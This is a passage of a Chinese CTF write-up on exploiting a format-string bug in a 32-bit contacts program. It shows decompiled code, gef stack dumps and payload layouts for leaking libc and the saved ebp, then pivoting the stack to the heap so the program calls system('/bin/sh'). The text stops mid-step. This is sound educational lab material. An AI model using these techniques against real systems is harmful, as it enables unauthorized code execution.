\u534a\u4fdd\u62a4\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u80fd hijack got \u8868\u5462\uff1fhijack retaddr \u5462\uff1f\uff09 \u5206\u6790\u7a0b\u5e8f \u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6253\u5370\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo(int a1, int a2, int a3, char *format) { printf(\"\\tName: %s\\n\", a1); printf(\"\\tLength %u\\n\", a2); printf(\"\\tPhone #: %s\\n\", a3); printf(\"\\tDescription: \"); return printf(format); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a format \u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u6ce8\u89e3 \uff1a\u53ef\u4ee5\u4ece\u8c03\u7528 PrintInfo \u7684\u4e0a\u5c42\u51fd\u6570\u67e5\u770b\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff1a\uff08v2 \u662f\u7ed3\u6784\u4f53\u94fe\u8868\uff09 sub_8048BD1(v2 + 8, *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 4), *(char **)v2); \u5229\u7528\u601d\u8def \u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684 shell\uff0c\u4ece\u800c\u62ff\u5230 flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 got \u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301 got \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709 printf \u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020 /bin/sh \u8ba9\u5b83\u6267\u884c system('/bin/sh')\uff0c\u4f46\u662f printf \u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u6ce8\u89e3 \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u8f93\u5165\u53c2\u6570\u7684\u51fd\u6570\u5c31\u53ea\u6709 printf \uff0c\u8bf8\u5982 puts \u7b49\u7684\u53c2\u6570\u90fd\u662f\u6211\u4eec\u4e0d\u53ef\u63a7\u7684\u3002\u56e0\u4e3a\u4fee\u6539 got \u8868\u4e4b\u540e\u6211\u4eec\u9700\u8981\u4f20\u5165 binsh \u7684\u5730\u5740\uff0c\u6240\u4ee5\u53ea\u80fd\u9009\u62e9 printf \u3002\u4f46\u662f\u9009\u62e9 printf \u53c8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u4fee\u6539\u5b8c\u540e\uff0cprintf \u5404\u4e2a\u5730\u65b9\u90fd\u4f1a\u7528\u5230\uff0c\u8fd8\u6ca1\u8fd0\u884c\u5230\u6211\u4eec\u80fd\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff0c\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u6302\u903c\u4e86\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0 wiki \u4e2d\u6ca1\u6709\u63d0\u53ca\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u5199\u5165\u5730\u5740\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u77e5\u9053\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u800c\u5b57\u7b26\u4e32\u6307\u9488\u662f\u5728\u6808\u4e0a\uff0c\u5f88\u660e\u663e\u7684\u73b0\u8c61\u5c31\u662f\u6808\u4e0a\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u660e\u6587\uff0c\u800c\u662f\u5b57\u7b26\u4e32\u7684\u5806\u5730\u5740\uff0c\u5c31\u7b97\u6211\u4eec\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u4e0d\u80fd\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u3002\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u5168\u90e8\u53ef\u63a7\u8f93\u5165\u90fd\u653e\u5728\u5806\u4e0a\uff09\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u627e\u6808\u4e0a\u73b0\u6709\u7684\u5730\u5740\u3002 \u8d85\u957f\u504f\u79fb\u80fd\u53d6\u5230\u503c\uff1f\u6211\u4eec\u5f53\u5b83\u662f\u53ef\u884c\u7684\u8bd5\u4e00\u8bd5\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5230\u63cf\u8ff0\u5806\u5757\u76f8\u5dee -0xf7fafed0 \uff0c\u504f\u79fb\u4e3a -1040105396 \uff0c\u6784\u9020\u5c1d\u8bd5\u4e00\u4e0b\uff1a \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165 system_addr + 'bbbb' + addr of '/bin/sh\u2018 \u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u6ce8\u89e3 \uff1a \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u53ea\u80fd\u5728\u6808\u4e0a\u901a\u8fc7\u504f\u79fb\u627e\u5730\u5740\uff0c\u800c\u6808\u4e0a\u6ca1\u6709\u6307\u5411 eip \u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u627e\u4e0d\u5230 eip \u5730\u5740\uff0c\u5c31\u4e0d\u80fd\u4fee\u6539 eip \u7684\u503c\u3002 \u6ce8\u89e3 \uff1a \u5c31\u56e0\u4e3a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528 hijack GOT \u3001hijack retaddr \u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7 leave \u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58 ebp \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884c leave \u6307\u4ee4\u7684\u65f6\u5019\uff0c esp \u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\uff08leave \u6307\u4ee4\u7b49\u4e8e\uff1a mov esp,ebp;pop ebp; \uff09 \u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58 ebp \u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6 PrintInfo \u51fd\u6570\u4e2d\u5b58\u50a8 ebp \u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684 ebp \u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58 ebp \u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684 ebp \u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373 main \u51fd\u6570\uff09\u7684 ebp \u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6839\u636e libc database \u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3a system_addr + 'bbbb' + binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684 ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684 ebp) \u4e3a \u5b58\u50a8 system_addr \u7684\u5730\u5740 -4 \u3002 \u6ce8\u89e3 \uff1a \u4e3a\u4ec0\u662f system_addr \u7684\u5730\u5740 -4 \uff1f\u662f\u56e0\u4e3a\u7a0b\u5e8f\u672b\u5c3e\u7684 leave;ret \u6267\u884c\u5b8c leave \u540e\uff0cesp \u662f\u6307\u5411 ebp \u7684\uff0c\u7136\u540e esp \u7684\u503c\u4f1a\u589e\u52a0\u4e00\u4e2a\u673a\u5668\u957f\u5ea6\uff08\u8fd9\u65f6 esp \u521a\u597d\u662f\u6307\u5411 eip \uff09\uff0c\u518d\u6267\u884c ret \u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\uff08\u7b2c\u4e00\u7b2c\u4e8c\u5408\u5e76\u7b49\u4e8e leave \uff09 move esp,ebp\uff0c\u5c06 esp \u6307\u5411 system_addr \u7684\u5730\u5740 - 4 pop ebp\uff0c \u5c06 esp \u6307\u5411 system_addr ret\uff0c\u5c06 eip \u6307\u5411 system_addr\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002 \u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53ca PrintInfo \u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684 libc_start_main_ret \u5730\u5740 (\u8be5\u5730\u5740\u662f\u5f53 main \u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570) \u6765\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728 printf \u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 printf \u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [esp] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [esp] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [#1] 0x8048c27 \u2192 leave [#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [#3] 0x80487a2 \u2192 jmp 0x80487b3 [#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [#5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 ['$esp', '140'] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 ['$esp', 'l140'] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 (\"g+\"?) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 (\"%s\"?) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 (\"P\"?) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u662f __libc_start_main \u7684\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528 fmtarg \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 31\uff08\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728 0xffffcd00 \uff09\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636e libc-database \u6765\u83b7\u53d6\u5bf9\u5e94\u7684 libc\uff0c\u7ee7\u800c\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740 0xffffcd2c \u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 11\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5bfb\u5740\u5806\u4e2d\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u7684\u5185\u5b58\u9996\u5730\u5740\uff0c\u6211\u4eec\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] \u4fdd\u5b58\u5728\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u4e2d\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 6\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684 ebp \u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740 \u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684 ebp \u5730\u5740\u3002 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684 bbbb \u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684 ebp \u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u6ce8\u89e3 \uff1a \u56e0\u4e3a PrintInfo \u80af\u5b9a\u662f\u901a\u8fc7 main \u51fd\u6570\u8c03\u7528\u7684\uff0c\u800c main \u51fd\u6570\u4e00\u76f4\u6ca1\u6709\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u5728\u5185\u5b58\u7684\u67d0\u4e00\u56fa\u5b9a\u4f4d\u7f6e\u3002PrintInfo \u662f\u5728 main \u6808\u57fa\u7840\u4e0a\u5f80\u4f4e\u5730\u5740\u751f\u957f\u7684\uff0c\u6240\u4ee5\u53ea\u6709 PrintInfo \u7ed3\u6784\u56fa\u5b9a ebp \u5730\u5740\u4e5f\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002PrintInfo \u7ed3\u6784\u56fa\u5b9a\u662f\u56e0\u4e3a\u6240\u6709\u8f93\u51fa\u5185\u5bb9\uff08\u53f7\u7801\u3001\u63cf\u8ff0\u7b49\uff09\u90fd\u662f\u4ee5\u5806\u5806\u6307\u9488\u5f62\u5f0f\u5b58\u50a8\u7684\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u957f\u5ea6\u5982\u4f55\u53d8\u5316\u5728\u6808\u4e0a\u6240\u5728\u7a7a\u95f4\u90fd\u662f\u4e0d\u53d8\u7684\uff0cebp \u7684\u504f\u79fb\u4e5f\u5c31\u662f\u56fa\u5b9a\u4e86\u3002 \u5728\u90e8\u5206\u73af\u5883\u4e0b\uff0csystem \u5730\u5740\u4f1a\u51fa\u73b0 \\ x00\uff0c\u5bfc\u81f4 printf \u7684\u65f6\u5019\u51fa\u73b0 0 \u622a\u65ad\u5bfc\u81f4\u65e0\u6cd5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 payload \u7684\u4fee\u6539\u5982\u4e0b\uff1a [%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd] payload \u4fee\u6539\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5728 heap \u4e0a\u52a0\u5165 12 \u7684\u504f\u79fb\u3002\u8fd9\u6837\u4fdd\u8bc1\u4e86 0 \u622a\u65ad\u51fa\u73b0\u5728\u6cc4\u9732\u4e4b\u540e\u3002 [%6$p] \uff1a\u4e0a\u5c42\u51fd\u6570 ebp \u5730\u5740\uff1b [%11$p] \uff1a\u5806\u5757 fd \u6307\u9488\u5730\u5740\uff1b \u4fee\u6539 ebp \u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884c leave\uff08 ~~move \u6307\u4ee4\u5c06 ebp \u8d4b\u7ed9 esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884c pop ebp~~ \uff09\u624d\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06 ebp \u4fee\u6539\u4e3a\u5b58\u50a8 system \u5730\u5740 -4 \u7684\u503c\u3002\u8fd9\u6837 move esp,ebp \u4e4b\u540e\uff0cesp \u6070\u597d\u6307\u5411\u4fdd\u5b58 system \u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884c ret \u6307\u4ee4\u5373\u53ef\u6267\u884c system \u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684 ebp \u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a 